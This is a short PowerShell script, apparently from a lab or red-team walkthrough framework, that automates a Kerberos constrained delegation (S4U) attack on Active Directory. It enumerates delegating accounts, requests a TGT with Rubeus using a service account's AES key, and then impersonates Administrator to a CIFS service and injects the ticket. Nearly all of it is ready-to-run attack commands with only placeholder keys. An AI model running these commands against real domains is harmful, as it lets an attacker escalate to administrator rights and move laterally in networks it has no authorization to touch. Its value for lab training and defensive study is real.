# CADRE — WT#005/006 Constrained Delegation (S4U)
. ..\lib\cadre-env.ps1
. ..\lib\common.ps1
print_banner "WT#005/006 - Constrained Delegation"
start_attack "005" "Constrained Delegation (S4U)"
require_tool Rubeus.exe

step "Enumerate accounts with msDS-AllowedToDelegateTo set"
run_cmd "Get-ADObject -Filter {msDS-AllowedToDelegateTo -like '*'} -Properties msDS-AllowedToDelegateTo | Select Name,msDS-AllowedToDelegateTo"

step "Request TGT for the delegating account (use its hash/AES key)"
run_cmd "Rubeus.exe asktgt /user:svc_mssql /domain:$DOMAIN_CHILD /aes256:<key> /nowrap"

step "S4U2Self+S4U2Proxy: impersonate Administrator to an allowed SPN"
# WT#005 = with protocol transition (/altservice usable), WT#006 = without (use allowed SPN only)
run_cmd "Rubeus.exe s4u /user:svc_mssql /domain:$DOMAIN_CHILD /aes256:<key> /impersonateuser:Administrator /msdsspn:cifs/mbr02.$DOMAIN_EXT /ptt"

result $LASTEXITCODE "Constrained Delegation completed"
